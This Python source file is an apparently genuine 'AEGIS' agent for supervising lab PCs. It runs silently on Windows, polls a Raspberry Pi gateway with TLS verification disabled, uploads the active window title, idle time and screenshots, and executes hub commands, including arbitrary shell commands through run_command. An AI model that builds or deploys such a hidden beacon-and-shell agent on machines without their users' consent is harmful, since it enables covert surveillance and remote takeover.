"""AEGIS Silent Lab PC Reverse-Heartbeat Agent.
Replicates the Piet Lab Supervision Architecture:
- Runs silently via pythonw.exe on Windows (zero command prompt windows, auto-starts on boot).
- Outbound polling every 6 seconds to Raspberry Pi Funnel (https://raspberrypi.tailc8c1f6.ts.net).
- Zero inbound open ports required (100% traversal of campus/college NAT & firewalls).
- Transmits telemetry: Active foreground window, idle time, CPU/RAM, and screenshot thumbnail.
- Executes hub commands delivered inside heartbeat responses:
    - warn: Pops up high-priority administrator alert dialog on user screen
    - lock: Calls Windows LockWorkStation (locks PC instantly)
    - shutdown: Initiates graceful OS shutdown
    - capture: Takes high-resolution screenshot and uploads to gateway
    - run_command: Runs shell/admin command
"""
import sys
import os
import time
import io
import base64
import socket
import argparse
import subprocess
import httpx
from datetime import datetime, timezone

# Add workspace root to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from aegis_core.models import NodeTelemetry, GPUInfo, CommandResult

def get_active_window_title() -> str:
    """Gets title of current foreground window on Windows."""
    if sys.platform == "win32":
        try:
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            if hwnd:
                buf = ctypes.create_unicode_buffer(512)
                user32.GetWindowTextW(hwnd, buf, 512)
                title = buf.value.strip()
                if title:
                    return title
        except Exception:
            pass
    return "Desktop / Explorer"

def get_idle_time_seconds() -> float:
    """Calculates user idle time in seconds using Windows GetLastInputInfo."""
    if sys.platform == "win32":
        try:
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
                millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
                return round(millis / 1000.0, 1)
        except Exception:
            pass
    return 0.0

def capture_screenshot(thumbnail: bool = True) -> str:
    """Captures desktop screen, encodes as base64 JPEG."""
    try:
        from PIL import ImageGrab, Image
        img = ImageGrab.grab()
        if thumbnail:
            img.thumbnail((320, 180), Image.Resampling.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=55 if thumbnail else 85)
        return base64.b64encode(buf.getvalue()).decode("ascii")
    except Exception:
        return ""

class LabPCReverseAgent:
    def __init__(self, node_id: str = None,
                 gateway_url: str = "https://raspberrypi.tailc8c1f6.ts.net",
                 fallback_url: str = "http://100.106.207.27:9000",
                 poll_interval: float = 6.0):
        self.node_id = node_id or socket.gethostname().lower()
        self.gateway_url = gateway_url.rstrip("/")
        self.fallback_url = fallback_url.rstrip("/")
        self.poll_interval = poll_interval
        self.is_running = True
        self.is_locked = False

    def build_telemetry(self) -> dict:
        import psutil
        cpu = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory().percent
        active_win = get_active_window_title()
        idle_sec = get_idle_time_seconds()
        shot = capture_screenshot(thumbnail=True)

        status = "locked" if self.is_locked else ("idle" if idle_sec > 180 else "online")

        telem = NodeTelemetry(
            node_id=self.node_id,
            name=f"Lab PC ({self.node_id})",
            ip="127.0.0.1",
            status=status,
            cpu_percent=cpu,
            ram_percent=ram,
            gpu=GPUInfo(name="Host Display", vram_total_mb=0, utilization_pct=0),
            active_model="N/A",
            capabilities=["desktop_supervision", "remote_control"],
            active_window=active_win,
            idle_time_seconds=idle_sec,
            screenshot_b64=shot,
            client_type="lab_pc",
            os_platform="windows" if sys.platform == "win32" else "linux"
        )
        return telem.model_dump(mode="json")

    def execute_command(self, cmd: dict) -> dict:
        cmd_id = cmd.get("command_id", f"cmd-{int(time.time())}")
        cmd_type = cmd.get("command_type")
        payload = cmd.get("payload", {})

        result = {
            "command_id": cmd_id,
            "node_id": self.node_id,
            "status": "completed",
            "output": "",
            "error": "",
            "screenshot_b64": None
        }

        if cmd_type == "warn":
            msg = payload.get("message", "Attention: Laboratory Administrator Notice.")
            # Show modal warning box on user screen
            if sys.platform == "win32":
                import ctypes
                # MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL (0x00000000 | 0x00000030 | 0x00001000)
                ctypes.windll.user32.MessageBoxW(0, msg, "AEGIS Lab Supervision Warning", 0x1030)
            result["output"] = f"Warning message displayed: {msg}"

        elif cmd_type == "lock":
            reason = payload.get("reason", "Locked by Lab Administrator")
            self.is_locked = True
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.LockWorkStation()
            result["output"] = f"Workstation locked: {reason}"

        elif cmd_type == "unlock":
            self.is_locked = False
            result["output"] = "Workstation unlocked"

        elif cmd_type == "capture":
            shot = capture_screenshot(thumbnail=False)
            result["screenshot_b64"] = shot
            result["output"] = "High-resolution screenshot captured"

        elif cmd_type == "shutdown":
            reason = payload.get("reason", "Scheduled lab shutdown")
            if sys.platform == "win32":
                subprocess.Popen(["shutdown", "/s", "/t", "30", "/c", reason])
            else:
                subprocess.Popen(["shutdown", "-h", "+1", reason])
            result["output"] = f"Shutdown initiated: {reason}"

        elif cmd_type == "run_command":
            cmd_str = payload.get("command", "")
            try:
                proc = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=30)
                result["output"] = proc.stdout[:1000]
                result["error"] = proc.stderr[:500]
                result["status"] = "completed" if proc.returncode == 0 else "failed"
            except Exception as e:
                result["error"] = str(e)
                result["status"] = "failed"

        return result

    def start_polling(self):
        gateways = [self.gateway_url, self.fallback_url]
        client = httpx.Client(verify=False, timeout=5.0)

        while self.is_running:
            telem = self.build_telemetry()
            for gw in gateways:
                try:
                    res = client.post(f"{gw}/api/client/heartbeat", json=telem)
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("has_command"):
                            cmd = data["command"]
                            cmd_res = self.execute_command(cmd)
                            # Report result back
                            try:
                                client.post(f"{gw}/api/client/command_result", json=cmd_res)
                            except Exception:
                                pass
                        break
                except Exception:
                    pass

            time.sleep(self.poll_interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AEGIS Silent Lab PC Reverse-Heartbeat Agent")
    parser.add_argument("--id", default=None, help="Lab PC ID (defaults to hostname)")
    parser.add_argument("--gateway", default="https://raspberrypi.tailc8c1f6.ts.net", help="Raspberry Pi Tailscale Funnel Gateway")
    parser.add_argument("--interval", type=float, default=6.0, help="Heartbeat polling interval in seconds (default 6s)")
    args = parser.parse_args()

    agent = LabPCReverseAgent(
        node_id=args.id,
        gateway_url=args.gateway,
        poll_interval=args.interval
    )
    agent.start_polling()
